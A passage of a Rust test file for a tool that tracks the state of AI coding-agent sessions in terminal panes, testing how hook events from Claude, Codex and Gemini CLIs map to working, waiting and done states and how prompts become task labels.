// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 ORASCOPE Co.,Ltd. (https://www.orascope.net)

//! What a hook must and must not write, and which pane it is allowed to write.

use std::collections::HashMap;

use time::{Duration, OffsetDateTime};
use tower_hook::{claude, codex, gemini, hook_backend, hook_pane, opencode};
use tower_scan::{id_for_pane, HOOK_PRECEDENCE};
use tower_state::{Agent, AgentState, Store};

/// Epoch itself means "never hooked", so the fixture clock starts well after
/// it — otherwise a record a hook just touched reads as untouched.
fn at(mins: i64) -> OffsetDateTime {
    OffsetDateTime::UNIX_EPOCH + Duration::days(20_000) + Duration::minutes(mins)
}

const HOME: &str = "/home/u";
/// herdr's default socket for [`HOME`]: under `.config/herdr`, or on Windows
/// under `AppData\Roaming\herdr` (no `APPDATA` in these tests' environment).
#[cfg(not(windows))]
const DEFAULT_SOCK: &str = "/home/u/.config/herdr/herdr.sock";
#[cfg(windows)]
const DEFAULT_SOCK: &str = "/home/u\\AppData\\Roaming\\herdr\\herdr.sock";

/// An environment lookup over a fixed table, so no test depends on the machine
/// running it.
fn vars<const N: usize>(pairs: [(&str, &str); N]) -> impl Fn(&str) -> Option<String> {
    let m: HashMap<String, String> = pairs
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    move |k| m.get(k).cloned().filter(|v| !v.is_empty())
}

/// The environment herdr really injects into a pane it owns — the socket path
/// included, which it plants in *every* pane.
fn env(pane: &str) -> impl Fn(&str) -> Option<String> {
    vars([
        ("HOME", HOME),
        ("HERDR_ENV", "1"),
        ("HERDR_PANE_ID", pane),
        ("HERDR_SOCKET_PATH", DEFAULT_SOCK),
    ])
}

fn store() -> (tempfile::TempDir, Store) {
    let d = tempfile::tempdir().unwrap();
    let s = Store::new(d.path()).unwrap();
    (d, s)
}

fn load(s: &Store, kind: &str, pane: &str) -> Agent {
    s.load(&id_for_pane(kind, pane)).unwrap()
}

const CLAUDE_IN: &str = r#"{"session_id":"10ec8033-ca55","cwd":"/w/herdr-tower",
    "hook_event_name":"Stop","unknown_field":123}"#;

// ---------------------------------------------------------------- guard

/// Backend namespaces make the same pane coordinate safe in every Herdr server.
#[test]
fn hooks_from_every_backend_are_namespaced() {
    for (name, socket, session, default_backend) in [
        ("default server", DEFAULT_SOCK, "", true),
        (
            "named session",
            "/home/u/.config/herdr/sessions/lab/herdr.sock",
            "lab",
            false,
        ),
        ("separate socket", "/tmp/other/herdr.sock", "", false),
    ] {
        let (_d, s) = store();
        let e = vars([
            ("HOME", HOME),
            ("HERDR_ENV", "1"),
            ("HERDR_PANE_ID", "w2:p3"),
            ("HERDR_SOCKET_PATH", socket),
            ("HERDR_SESSION", session),
        ]);
        claude::run(&s, "stop", CLAUDE_IN.as_bytes(), e, at(0)).unwrap();
        let records = s.list().unwrap();
        assert_eq!(records.len(), 1, "{name}");
        assert_eq!(
            records[0].pane.backend.is_empty(),
            default_backend,
            "{name}"
        );
    }
}

/// herdr plants `HERDR_SOCKET_PATH` in every pane it owns, so treating the
/// variable's presence as "another server" rejects every hook there is. That
/// shipped once; the symptom was a store that simply stayed empty.
#[test]
fn the_injected_socket_path_alone_is_not_a_rejection() {
    assert_eq!(hook_pane(env("w2:p4S")), Some("w2:p4S".to_string()));
}

/// The socket is compared as a path, not as a string, so a home directory that
/// happens to carry a trailing separator does not silently reject every hook.
#[test]
fn a_trailing_separator_in_home_still_matches_the_default_socket() {
    let e = vars([
        ("HOME", "/home/u/"),
        ("HERDR_ENV", "1"),
        ("HERDR_PANE_ID", "w2:p4S"),
        ("HERDR_SOCKET_PATH", DEFAULT_SOCK),
    ]);
    assert_eq!(hook_pane(e), Some("w2:p4S".to_string()));
}

/// An explicit socket remains a safe namespace even when HOME is absent.
#[test]
fn without_a_home_an_explicit_socket_is_still_namespaced() {
    let e = vars([
        ("HERDR_ENV", "1"),
        ("HERDR_PANE_ID", "w2:p4S"),
        ("HERDR_SOCKET_PATH", DEFAULT_SOCK),
    ]);
    assert_eq!(hook_pane(&e), Some("w2:p4S".to_string()));
    assert!(!hook_backend(e).is_empty());
}

/// Being inside herdr is what `HERDR_ENV` states; a stray `HERDR_PANE_ID` in
/// some unrelated process's environment does not make it a supervised pane.
#[test]
fn a_pane_id_without_herdr_env_is_dropped() {
    let e = vars([("HOME", HOME), ("HERDR_PANE_ID", "w2:p4S")]);
    assert_eq!(hook_pane(e), None);
}

/// Nothing outside herdr is supervised, and a hook that fires there writes
/// nothing at all rather than inventing a coordinate.
#[test]
fn outside_herdr_no_record_is_created() {
    let (_d, s) = store();
    claude::run(&s, "stop", CLAUDE_IN.as_bytes(), env(""), at(0)).unwrap();
    gemini::run(&s, "stop", CLAUDE_IN.as_bytes(), env(""), at(0)).unwrap();
    codex::run(&s, "stop", CLAUDE_IN.as_bytes(), env(""), at(0)).unwrap();
    codex::notify(
        &s,
        &[r#"{"type":"agent-turn-complete"}"#.to_string()],
        env(""),
        at(0),
    )
    .unwrap();
    assert!(s.list().unwrap().is_empty());
}

// --------------------------------------------------------------- claude

#[test]
fn claude_events_map_to_states() {
    for (event, want) in [
        ("post-tool-use", AgentState::Working),
        ("user-prompt-submit", AgentState::Working),
        ("session-start", AgentState::Idle),
        ("notification", AgentState::Waiting),
        ("stop", AgentState::DoneUnread),
    ] {
        let (_d, s) = store();
        claude::run(&s, event, CLAUDE_IN.as_bytes(), env("w2:p3"), at(0)).unwrap();
        let a = load(&s, "claude", "w2:p3");
        assert_eq!(a.state, want, "{event}");
        assert_eq!(a.session_id, "10ec8033-ca55", "{event}");
        assert_eq!(a.cwd, "/w/herdr-tower", "{event}");
    }
}

/// A CLI is free to add events. Reacting to one we do not know — with a state
/// or with an error — would be a guess on the agent's critical path.
#[test]
fn an_unknown_event_writes_nothing() {
    let (_d, s) = store();
    claude::run(&s, "mystery", CLAUDE_IN.as_bytes(), env("w2:p3"), at(0)).unwrap();
    assert!(s.list().unwrap().is_empty());
}

/// Folder bots autostarting after a reboot fire nothing but SessionStart. Read
/// as WORKING, the morning screen filled with busy agents nobody had asked for
/// anything.
#[test]
fn session_start_is_idle_not_working() {
    let (_d, s) = store();
    let mut pre = Agent::new(id_for_pane("claude", "w2:p3"), "claude", at(0));
    pre.state = AgentState::Working;
    s.save(&pre).unwrap();

    let body = br#"{"session_id":"s-new","source":"startup"}"#;
    claude::run(&s, "session-start", &body[..], env("w2:p3"), at(1)).unwrap();
    assert_eq!(load(&s, "claude", "w2:p3").state, AgentState::Idle);
}

/// A compact happens mid-turn: the context was compacted, not restarted.
/// Taking WORKING down to IDLE there loses the running turn off the screen.
#[test]
fn session_start_from_a_compact_keeps_the_turn() {
    let (_d, s) = store();
    claude::run(
        &s,
        "user-prompt-submit",
        &br#"{"session_id":"s"}"#[..],
        env("w2:p3"),
        at(0),
    )
    .unwrap();

    let body = br#"{"session_id":"s","source":"compact"}"#;
    let moved = claude::run(&s, "session-start", &body[..], env("w2:p3"), at(1)).unwrap();
    let a = load(&s, "claude", "w2:p3");
    assert_eq!(a.state, AgentState::Working);
    assert_eq!(a.state_since, at(0), "the turn kept running through it");
    assert!(moved.is_none(), "nothing to announce");
}

/// Ask is what the agent wants *now*. Left standing, a finished row wears
/// "Claude needs your permission" forever (seen on screen 2026-09-04).
#[test]
fn a_notification_fills_ask_and_the_next_event_clears_it() {
    let (_d, s) = store();
    let ask = r#"{"session_id":"s1","message":"Bash 명령 실행 승인이 필요합니다"}"#;
    claude::run(&s, "notification", ask.as_bytes(), env("w2:p3"), at(0)).unwrap();
    assert_eq!(
        load(&s, "claude", "w2:p3").ask,
        "Bash 명령 실행 승인이 필요합니다"
    );

    claude::run(
        &s,
        "stop",
        &br#"{"session_id":"s1"}"#[..],
        env("w2:p3"),
        at(1),
    )
    .unwrap();
    assert!(load(&s, "claude", "w2:p3").ask.is_empty());
}

/// Approving the question produces a tool event, answering it produces a new
/// prompt. Either way the question is gone.
#[test]
fn a_pending_question_clears_when_work_resumes() {
    for event in ["post-tool-use", "user-prompt-submit"] {
        let (_d, s) = store();
        let ask = r#"{"session_id":"s1","message":"Claude needs your permission to use Bash"}"#;
        claude::run(&s, "notification", ask.as_bytes(), env("w2:p3"), at(0)).unwrap();
        claude::run(
            &s,
            event,
            &br#"{"session_id":"s1"}"#[..],
            env("w2:p3"),
            at(1),
        )
        .unwrap();

        let a = load(&s, "claude", "w2:p3");
        assert!(a.ask.is_empty(), "{event}");
        assert_eq!(a.state, AgentState::Working, "{event}");
    }
}

/// A live background shell defers the Stop hook and an Esc interrupt skips it,
/// so a finished turn can sit at WORKING with no signal that it ended. The 60s
/// idle echo is that signal, and it recovers the turn as "needs you".
#[test]
fn an_idle_echo_recovers_a_missed_stop() {
    let (_d, s) = store();
    claude::run(
        &s,
        "user-prompt-submit",
        &br#"{"session_id":"s"}"#[..],
        env("w2:p3"),
        at(0),
    )
    .unwrap();

    let idle = r#"{"session_id":"s","message":"Claude is waiting for your input"}"#;
    claude::run(&s, "notification", idle.as_bytes(), env("w2:p3"), at(5)).unwrap();

    let a = load(&s, "claude", "w2:p3");
    assert_eq!(a.state, AgentState::Waiting);
    assert!(
        a.ask.is_empty() && a.task.is_empty(),
        "an echo is not a question — it must not write one"
    );
}

/// Gemini's turn starts are its own events. Neither vendor sends anything named
/// like a prompt, so a `user-prompt-submit` branch here was dead code and Gemini
/// turns were never counted at all.
#[test]
fn a_gemini_agent_run_counts_a_turn() {
    for start in ["pre-invocation", "before-agent"] {
        let (_d, s) = store();
        let body = br#"{"session_id":"g1"}"#;

        gemini::run(&s, start, &body[..], env("w2:p5"), at(0)).unwrap();
        let a = load(&s, "gemini", "w2:p5");
        assert_eq!(a.state, AgentState::Working, "{start}");
        assert_eq!(a.work_seq, 1, "{start} began a turn");

        // A tool inside that run is not another turn.
        gemini::run(&s, "post-tool-use", &body[..], env("w2:p5"), at(1)).unwrap();
        assert_eq!(load(&s, "gemini", "w2:p5").work_seq, 1, "{start}");

        // After it finishes, the next run is its own turn.
        gemini::run(&s, "stop", &body[..], env("w2:p5"), at(3)).unwrap();
        gemini::run(&s, start, &body[..], env("w2:p5"), at(4)).unwrap();
        assert_eq!(load(&s, "gemini", "w2:p5").work_seq, 2, "{start}");
    }
}

/// The two start events are two products, and they are counted by what each one
/// means.
///
/// `before-agent` is the stock CLI's opening half of a pair — `after-agent` ends
/// the turn — so it counts wherever it arrives. A record still at WORKING is
/// what a *missed* `after-agent` leaves behind, and refusing to count there left
/// the prompt queued behind that unobserved turn unaccounted for: `close-all
/// --watch` then waited out its whole timeout on work that had finished.
///
/// `pre-invocation` is Antigravity's, and names an invocation rather than a
/// turn. Whether one turn can hold several has not been measured against a live
/// session, and counting each one is the worse mistake — the same watch would
/// read the running turn's completion as the answer to the instruction queued
/// behind it — so it stays conservative and costs a timeout instead.
#[test]
fn a_turn_level_gemini_start_counts_even_from_a_record_left_working() {
    let body = br#"{"session_id":"g1"}"#;

    let (_d, s) = store();
    gemini::run(&s, "before-agent", &body[..], env("w2:p5"), at(0)).unwrap();
    // The turn ends, and nothing observes it: no `after-agent`, no backend pass.
    gemini::run(&s, "before-agent", &body[..], env("w2:p5"), at(2)).unwrap();
    assert_eq!(
        load(&s, "gemini", "w2:p5").work_seq,
        2,
        "a stale WORKING is not a reason to lose a turn"
    );

    let (_d, s) = store();
    gemini::run(&s, "pre-invocation", &body[..], env("w2:p5"), at(0)).unwrap();
    gemini::run(&s, "pre-invocation", &body[..], env("w2:p5"), at(2)).unwrap();
    assert_eq!(
        load(&s, "gemini", "w2:p5").work_seq,
        1,
        "an invocation is not measured to be a turn"
    );
}

/// A prompt is a turn of its own wherever it starts from — including WAITING,
/// which is where a missed Stop hook leaves the record.
///
/// The count is what a batch watch uses to tell the turn it dispatched from the
/// one that was already running, so a prompt that does not move it lets
/// `close-all` report a session finished before its instruction has run.
#[test]
fn a_prompt_counts_a_turn_even_from_waiting() {
    let (_d, s) = store();
    let prompt = r#"{"session_id":"s","prompt":"고쳐줘"}"#.as_bytes();

    claude::run(&s, "user-prompt-submit", prompt, env("w2:p3"), at(0)).unwrap();
    let first = load(&s, "claude", "w2:p3").work_seq;
    assert_eq!(first, 1, "the first prompt began a turn");

    // The idle echo moves a completed turn to WAITING — the missed-stop path.
    let idle = r#"{"session_id":"s","notification_type":"idle_prompt"}"#;
    claude::run(&s, "notification", idle.as_bytes(), env("w2:p3"), at(1)).unwrap();
    assert_eq!(load(&s, "claude", "w2:p3").state, AgentState::Waiting);

    claude::run(&s, "user-prompt-submit", prompt, env("w2:p3"), at(2)).unwrap();
    assert_eq!(
        load(&s, "claude", "w2:p3").work_seq,
        2,
        "the next prompt is a new turn, not a resumed one"
    );

    // Answering a permission request is not.
    claude::run(
        &s,
        "post-tool-use",
        &br#"{"session_id":"s"}"#[..],
        env("w2:p3"),
        at(3),
    )
    .unwrap();
    assert_eq!(load(&s, "claude", "w2:p3").work_seq, 2);
}

/// The echo is recognised by its *kind* as well as its wording.
///
/// Claude Code sends `notification_type: "idle_prompt"` alongside the sentence.
/// Either alone is enough: a reworded or translated sentence still recovers the
/// missed stop, and so does a CLI that sends no type at all.
#[test]
fn an_idle_echo_is_recognised_by_its_type_as_well_as_its_text() {
    for body in [
        // The type, with wording this code has never seen.
        r#"{"session_id":"s","notification_type":"idle_prompt","message":"입력을 기다리고 있습니다"}"#,
        // The wording, with no type — every CLI before the field existed.
        r#"{"session_id":"s","message":"Claude is waiting for your input"}"#,
        // Both, which is what 2.1.266 actually sends.
        r#"{"session_id":"s","notification_type":"idle_prompt","message":"Claude is waiting for your input"}"#,
    ] {
        let (_d, s) = store();
        claude::run(
            &s,
            "user-prompt-submit",
            &br#"{"session_id":"s"}"#[..],
            env("w2:p3"),
            at(0),
        )
        .unwrap();
        claude::run(&s, "notification", body.as_bytes(), env("w2:p3"), at(5)).unwrap();

        let a = load(&s, "claude", "w2:p3");
        assert_eq!(a.state, AgentState::Waiting, "{body}");
        assert!(a.ask.is_empty(), "{body}: an echo is not a question");
    }
}

/// Everywhere else the echo means nothing happened, and overwriting a finished
/// or already-seen turn with a question nobody asked is worse than silence.
#[test]
fn an_idle_echo_never_overrides_a_settled_state() {
    for settled in [
        AgentState::DoneUnread,
        AgentState::Idle,
        AgentState::Waiting,
    ] {
        let (_d, s) = store();
        let mut pre = Agent::new(id_for_pane("claude", "w2:p3"), "claude", at(0));
        pre.state = settled;
        pre.pane.pane_id = "w2:p3".into();
        s.save(&pre).unwrap();

        let idle = r#"{"session_id":"s","message":"Claude is waiting for your input"}"#;
        let moved = claude::run(&s, "notification", idle.as_bytes(), env("w2:p3"), at(1)).unwrap();

        let a = load(&s, "claude", "w2:p3");
        assert_eq!(a.state, settled, "{settled:?}");
        assert!(a.ask.is_empty() && a.task.is_empty(), "{settled:?}");
        assert!(moved.is_none(), "{settled:?}: nothing to announce");
        assert!(
            a.hook_fresh(at(1), HOOK_PRECEDENCE),
            "{settled:?}: the hook still proved it is alive"
        );
    }
}

/// A real approval request during a turn is not an echo, and must still land.
#[test]
fn a_real_question_during_a_turn_still_waits() {
    let (_d, s) = store();
    claude::run(
        &s,
        "user-prompt-submit",
        &br#"{"session_id":"s"}"#[..],
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    let ask = r#"{"session_id":"s","message":"Bash 승인 필요"}"#;
    claude::run(&s, "notification", ask.as_bytes(), env("w2:p3"), at(1)).unwrap();

    let a = load(&s, "claude", "w2:p3");
    assert_eq!(a.state, AgentState::Waiting);
    assert_eq!(a.ask, "Bash 승인 필요");
}

/// The pane is the one fact a hook always has. A body that is empty, or that is
/// not the JSON we expect, must not cost us the event.
#[test]
fn an_unusable_payload_still_records_the_pane() {
    for body in [&b""[..], &b"not json at all"[..], &br#"{"cwd":42}"#[..]] {
        let (_d, s) = store();
        let t = claude::run(&s, "stop", body, env("w2:p5"), at(0))
            .unwrap()
            .expect("the event still happened");
        assert_eq!(t.to(), AgentState::DoneUnread);
        assert_eq!(load(&s, "claude", "w2:p5").pane.pane_id, "w2:p5");
    }
}

/// The scanner owns the coordinates and the task; a hook only adds meaning.
#[test]
fn a_hook_preserves_what_the_scanner_wrote() {
    let (_d, s) = store();
    let mut pre = Agent::new(id_for_pane("claude", "w2:p3"), "claude", at(0));
    pre.pane.session = "ai".into();
    pre.pane.window = 1;
    pre.pane.pane_id = "w2:p3".into();
    pre.task = "핸드오프 문서 확인".into();
    s.save(&pre).unwrap();

    claude::run(
        &s,
        "post-tool-use",
        &br#"{"session_id":"s1"}"#[..],
        env("w2:p3"),
        at(1),
    )
    .unwrap();

    let a = load(&s, "claude", "w2:p3");
    assert_eq!(a.pane.session, "ai");
    assert_eq!(a.pane.window, 1);
    assert_eq!(a.task, "핸드오프 문서 확인", "a hook never learns the task");
    assert_eq!(a.state, AgentState::Working);
}

/// Without the mark, the next scan quietly overwrites everything the hook just
/// learned with the backend's coarser view of the same pane.
#[test]
fn a_hook_marks_the_record_so_it_outranks_the_backend() {
    let (_d, s) = store();
    claude::run(&s, "stop", CLAUDE_IN.as_bytes(), env("w2:p3"), at(0)).unwrap();
    let a = load(&s, "claude", "w2:p3");
    assert!(a.hook_fresh(at(1), HOOK_PRECEDENCE));
    assert!(!a.hook_fresh(at(10), HOOK_PRECEDENCE), "precedence expires");
}

/// The caller decides whether a person gets interrupted, so the hook has to
/// report what actually moved — and stay quiet when nothing did.
#[test]
fn what_moved_is_reported_back() {
    let (_d, s) = store();
    let first = claude::run(&s, "user-prompt-submit", &br#"{}"#[..], env("w2:p3"), at(0))
        .unwrap()
        .unwrap();
    assert_eq!(first.prev, AgentState::Idle);
    assert_eq!(first.to(), AgentState::Working);
    assert!(first.moved());

    let again = claude::run(&s, "post-tool-use", &br#"{}"#[..], env("w2:p3"), at(1))
        .unwrap()
        .unwrap();
    assert!(
        !again.moved(),
        "a heartbeat is not a transition — announcing it teaches the user to ignore all of them"
    );

    assert!(
        claude::run(&s, "mystery", &br#"{}"#[..], env("w2:p3"), at(2))
            .unwrap()
            .is_none()
    );
}

// ---------------------------------------------------------------- codex

/// The notify program is the only place codex reports a finished turn.
#[test]
fn codex_notify_reports_a_finished_turn() {
    let (_d, s) = store();
    let arg = r#"{"type":"agent-turn-complete","turn-id":"x","cwd":"/w/proj"}"#.to_string();
    codex::notify(&s, &[arg], env("w2:p9"), at(0)).unwrap();

    let a = load(&s, "codex", "w2:p9");
    assert_eq!(a.state, AgentState::DoneUnread);
    assert_eq!(a.kind, "codex");
    assert_eq!(a.cwd, "/w/proj");
}

#[test]
fn codex_notify_ignores_types_it_does_not_know() {
    let (_d, s) = store();
    codex::notify(
        &s,
        &[r#"{"type":"mystery"}"#.to_string()],
        env("w2:p9"),
        at(0),
    )
    .unwrap();
    assert!(s.list().unwrap().is_empty());

    // codex could also call the program with nothing at all.
    codex::notify(&s, &[], env("w2:p9"), at(0)).unwrap();
    assert!(s.list().unwrap().is_empty());
}

/// notify only ever says a turn ended, so on that path alone codex showed as
/// DONE for the whole time it was working (seen on screen 2026-09-03). These
/// are the events that fill in the rest.
#[test]
fn codex_hooks_fill_in_working_and_waiting() {
    let (_d, s) = store();
    let body = r#"{"session_id":"s1","cwd":"/w/proj","hook_event_name":"UserPromptSubmit"}"#;
    codex::run(
        &s,
        "user-prompt-submit",
        body.as_bytes(),
        env("w2:p9"),
        at(0),
    )
    .unwrap();
    let a = load(&s, "codex", "w2:p9");
    assert_eq!(a.state, AgentState::Working);
    assert_eq!(a.session_id, "s1");
    assert_eq!(a.cwd, "/w/proj");

    for (event, want) in [
        ("permission-request", AgentState::Waiting),
        ("stop", AgentState::DoneUnread),
        ("session-start", AgentState::Idle),
    ] {
        codex::run(&s, event, &br#"{}"#[..], env("w2:p9"), at(1)).unwrap();
        assert_eq!(load(&s, "codex", "w2:p9").state, want, "{event}");
    }

    codex::run(&s, "mystery", &br#"{}"#[..], env("w2:p9"), at(2)).unwrap();
    assert_eq!(
        load(&s, "codex", "w2:p9").state,
        AgentState::Idle,
        "an unknown event leaves the state alone"
    );
}

// --------------------------------------------------------------- gemini

const AGY_IN: &str = r#"{"conversationId":"ec33ebf9-0cba","workspacePaths":["/w/herdr-tower"],
    "modelName":"Gemini 3.6 Flash (Medium)","stepIdx":5}"#;

/// agy speaks protojson camelCase, and its model name reaches the tower through
/// this hook or not at all — an agy session has no file on disk to read.
#[test]
fn gemini_reads_the_antigravity_payload() {
    for (event, want) in [
        ("pre-invocation", AgentState::Working),
        ("post-tool-use", AgentState::Working),
        ("stop", AgentState::DoneUnread),
    ] {
        let (_d, s) = store();
        gemini::run(&s, event, AGY_IN.as_bytes(), env("w2:p9"), at(0)).unwrap();
        let a = load(&s, "gemini", "w2:p9");
        assert_eq!(a.state, want, "{event}");
        assert_eq!(a.session_id, "ec33ebf9-0cba", "{event}");
        assert_eq!(a.cwd, "/w/herdr-tower", "{event}");
        assert_eq!(a.model, "Gemini 3.6 Flash (Medium)", "{event}");
    }
}

/// The stock CLI speaks snake_case and a different set of event names. Both
/// CLIs are supervised as one kind, so both payloads have to land.
#[test]
fn gemini_reads_the_stock_cli_payload() {
    const IN: &str = r#"{"session_id":"abc-123","cwd":"/w/proj","hook_event_name":"AfterAgent",
        "timestamp":"2026-08-26T01:00:00Z"}"#;
    for (event, want) in [
        ("session-start", AgentState::Idle),
        ("before-agent", AgentState::Working),
        ("after-tool", AgentState::Working),
        ("notification", AgentState::Waiting),
        ("after-agent", AgentState::DoneUnread),
    ] {
        let (_d, s) = store();
        gemini::run(&s, event, IN.as_bytes(), env("w2:p9"), at(0)).unwrap();
        let a = load(&s, "gemini", "w2:p9");
        assert_eq!(a.state, want, "{event}");
        assert_eq!(a.session_id, "abc-123", "{event}");
        assert_eq!(a.cwd, "/w/proj", "{event}");
    }
}

#[test]
fn gemini_ignores_events_it_does_not_know() {
    let (_d, s) = store();
    gemini::run(
        &s,
        "post-invocation",
        AGY_IN.as_bytes(),
        env("w2:p9"),
        at(0),
    )
    .unwrap();
    assert!(s.list().unwrap().is_empty());
}

#[test]
fn gemini_tolerates_an_empty_body() {
    let (_d, s) = store();
    gemini::run(&s, "stop", &b""[..], env("w2:p9"), at(0)).unwrap();
    assert_eq!(load(&s, "gemini", "w2:p9").state, AgentState::DoneUnread);
}

/// Named and custom servers are safe in the shared store because their records
/// carry a backend namespace; a separate state directory is no longer required.
#[test]
fn a_named_session_is_recorded_in_the_shared_store() {
    let isolated = vars([
        ("HERDR_ENV", "1"),
        ("HERDR_PANE_ID", "w2:p4S"),
        ("HERDR_SESSION", "lab"),
        ("HOME", HOME),
        (
            "HERDR_TOWER_STATE_DIR",
            "/home/u/.local/state/herdr-tower-lab",
        ),
    ]);
    assert_eq!(
        tower_hook::hook_pane(&isolated).as_deref(),
        Some("w2:p4S"),
        "the backend namespace prevents coordinate collisions"
    );

    let shared = vars([
        ("HERDR_ENV", "1"),
        ("HERDR_PANE_ID", "w2:p4S"),
        ("HERDR_SESSION", "lab"),
        ("HOME", HOME),
    ]);
    assert_eq!(tower_hook::hook_pane(&shared), Some("w2:p4S".into()));
    assert!(!tower_hook::hook_backend(&shared).is_empty());

    for same in [
        "/home/u/.local/state/herdr-tower",
        "/home/u/.local/state/herdr-tower/",
        "/home/u/./.local/state/herdr-tower",
        "/home/u/.local/state/../state/herdr-tower",
    ] {
        let pretend = vars([
            ("HERDR_ENV", "1"),
            ("HERDR_PANE_ID", "w2:p4S"),
            ("HERDR_SESSION", "lab"),
            ("HOME", HOME),
            ("HERDR_TOWER_STATE_DIR", same),
        ]);
        assert_eq!(
            tower_hook::hook_pane(&pretend),
            Some("w2:p4S".into()),
            "{same:?} is safe because the record identity includes its backend"
        );
    }

    // And a non-default socket follows the same rule as a named session.
    let other_socket = vars([
        ("HERDR_ENV", "1"),
        ("HERDR_PANE_ID", "w2:p4S"),
        ("HERDR_SOCKET_PATH", "/tmp/other/herdr.sock"),
        ("HOME", HOME),
    ]);
    assert_eq!(tower_hook::hook_pane(&other_socket), Some("w2:p4S".into()));
}

/// A prompt fills the TASK column.
///
/// Nothing in the tree ever wrote `Agent.task`, so every row's TASK was blank and
/// a finished agent could not say what it had done — which is the only thing that
/// column is for. Confirmed against the live store before fixing: zero records
/// carried the field.
#[test]
fn a_prompt_becomes_the_task() {
    let (_d, s) = store();
    let stdin = r#"{"session_id":"sid-1","cwd":"/proj",
        "prompt":"  로그인 폼 다크모드로 바꿔줘\nand keep the spacing  "}"#;
    tower_hook::claude::run(
        &s,
        "user-prompt-submit",
        stdin.as_bytes(),
        env("w2:p4S"),
        at(0),
    )
    .unwrap();

    let a = s.load("claude-w2:p4S").unwrap();
    assert_eq!(
        a.task, "로그인 폼 다크모드로 바꿔줘",
        "the first non-empty line, trimmed"
    );
    assert_eq!(a.state, tower_state::AgentState::Working);
}

/// A new instruction answers whatever the last one asked.
#[test]
fn a_new_prompt_clears_the_pending_question() {
    let (_d, s) = store();
    let mut a = tower_state::Agent::new("claude-w2:p4S", "claude", at(0));
    a.pane.pane_id = "w2:p4S".into();
    a.ask = "권한을 승인해 주세요".into();
    a.transition(tower_state::AgentState::Waiting, at(0));
    s.save(&a).unwrap();

    tower_hook::claude::run(
        &s,
        "user-prompt-submit",
        r#"{"prompt":"승인"}"#.as_bytes(),
        env("w2:p4S"),
        at(1),
    )
    .unwrap();
    let got = s.load("claude-w2:p4S").unwrap();
    assert_eq!(got.task, "승인");
    assert!(got.ask.is_empty(), "the question was answered");
}

/// A payload without the field leaves the column exactly as it was.
///
/// The field name comes from Claude Code's documented `UserPromptSubmit` payload
/// and has not been checked against a live one. If it is wrong, this is the
/// behaviour that results: blank, which is what shipped before.
#[test]
fn a_payload_with_no_prompt_leaves_the_task_alone() {
    let (_d, s) = store();
    tower_hook::claude::run(
        &s,
        "user-prompt-submit",
        r#"{"session_id":"sid-1"}"#.as_bytes(),
        env("w2:p4S"),
        at(0),
    )
    .unwrap();
    assert!(s.load("claude-w2:p4S").unwrap().task.is_empty());
}

/// A prompt is the TASK column's only source, and the field is documented as
/// the instruction *in the user's words*. The harness submits prompts of its
/// own to wake an agent — `<task-notification>` is the one seen in the wild —
/// and those are not words anybody chose.
///
/// Declining one leaves the real task standing rather than burying it under a
/// string that tells a reader nothing.
#[test]
fn a_harness_wakeup_does_not_become_the_task() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);

    claude::run(
        &s,
        "user-prompt-submit",
        prompt("fix the card refresh").as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    assert_eq!(load(&s, "claude", "w2:p3").task, "fix the card refresh");

    claude::run(
        &s,
        "user-prompt-submit",
        prompt("<task-notification>").as_bytes(),
        env("w2:p3"),
        at(1),
    )
    .unwrap();
    let a = load(&s, "claude", "w2:p3");
    assert_eq!(
        a.task, "fix the card refresh",
        "the real instruction is still what the row says"
    );
    assert_eq!(
        a.state,
        AgentState::Working,
        "the state update the same payload carries is unaffected"
    );
}

/// A real prompt may open with a tag on a line of its own and go on to ask for
/// something. Testing the first line and giving up discarded the whole
/// instruction and left the previous task on the row — the opposite of the
/// intent, and worse than the noise the rule removes.
#[test]
fn a_prompt_that_opens_with_a_tag_keeps_its_instruction() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);

    claude::run(
        &s,
        "user-prompt-submit",
        prompt("earlier task").as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();

    claude::run(
        &s,
        "user-prompt-submit",
        prompt("<environment_context>\n\nplease review this").as_bytes(),
        env("w2:p3"),
        at(1),
    )
    .unwrap();
    assert_eq!(
        load(&s, "claude", "w2:p3").task,
        "please review this",
        "the tag line is skipped, not the prompt"
    );
}

/// `None` is reached only when every line is a bare tag — a pure wake-up,
/// however many lines it carries.
#[test]
fn a_wakeup_of_several_tag_lines_is_still_a_wakeup() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);

    claude::run(
        &s,
        "user-prompt-submit",
        prompt("earlier task").as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    claude::run(
        &s,
        "user-prompt-submit",
        prompt("<task-notification>\n\n<resume>").as_bytes(),
        env("w2:p3"),
        at(1),
    )
    .unwrap();
    assert_eq!(load(&s, "claude", "w2:p3").task, "earlier task");
}

/// The rule has to be narrow: a prompt that merely mentions a tag is an
/// ordinary question, and blanking the column for it would be worse than the
/// noise it is meant to remove.
#[test]
fn a_prompt_that_merely_contains_a_tag_is_a_real_task() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);
    for text in [
        "<task-notification> and then run the tests",
        "why does <div> not close here",
        "explain Vec<String> to me",
        "<not a tag>",
        "<>",
    ] {
        claude::run(
            &s,
            "user-prompt-submit",
            prompt(text).as_bytes(),
            env("w2:p3"),
            at(0),
        )
        .unwrap();
        assert_eq!(load(&s, "claude", "w2:p3").task, text, "{text:?}");
    }
}

/// The two shapes are told apart by whether the tag closes. A wake-up closes
/// nothing, so it costs one line and whatever follows still counts — otherwise
/// skipping blocks would swallow the instruction it was meant to uncover.
#[test]
fn an_unclosed_tag_costs_one_line_not_the_rest() {
    let (_d, s) = store();
    let prompt = |p: &str| format!(r#"{{"session_id":"s","prompt":{p:?}}}"#);

    claude::run(
        &s,
        "user-prompt-submit",
        prompt("<task-notification>\ncarry on with the card").as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    assert_eq!(
        load(&s, "claude", "w2:p3").task,
        "carry on with the card",
        "<task-notification> has no closing tag, so it opens nothing"
    );

    // A stray close with nothing above it is skipped too, not taken as a task.
    claude::run(
        &s,
